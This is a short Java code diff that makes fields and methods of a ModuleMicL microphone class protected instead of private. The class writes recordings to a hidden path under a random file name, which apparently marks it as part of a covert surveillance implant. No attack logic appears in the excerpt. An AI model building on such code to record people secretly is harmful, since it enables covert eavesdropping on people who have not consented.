@@ -30,10 +30,10 @@ import java.io.IOException;
 public class ModuleMicL extends ModuleMic {
 
 	private static final String TAG = "ModuleMicL"; //$NON-NLS-1$
-	private static final long MAX_FILE_SIZE = 1024 * 50;//50KB
+	protected static final long MAX_FILE_SIZE = 1024 * 50;//50KB
 
-	private AutoFile out_file;
-	private static int MAX_NUM_OF_FAILURE = 10;
+	protected AutoFile out_file;
+	protected static int MAX_NUM_OF_FAILURE = 10;
 
 	public ModuleMicL() {
 		super();
@@ -156,7 +156,7 @@ public class ModuleMicL extends ModuleMic {
 		}
 	}
 
-	private void createSockets() {
+	protected void createSockets() {
 		if (out_file == null) {
 			out_file = new AutoFile(Path.hidden(), Utils.getRandom() + ModuleMic.MIC_SUFFIX);
 			if (Cfg.DEBUG) {
@@ -165,7 +165,7 @@ public class ModuleMicL extends ModuleMic {
 		}
 	}
 
-	private void deleteSockets() {
+	protected void deleteSockets() {
 		if (out_file != null && out_file.exists()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (deleteSockets) delete file: " + out_file.getFile());//$NON-NLS-1$
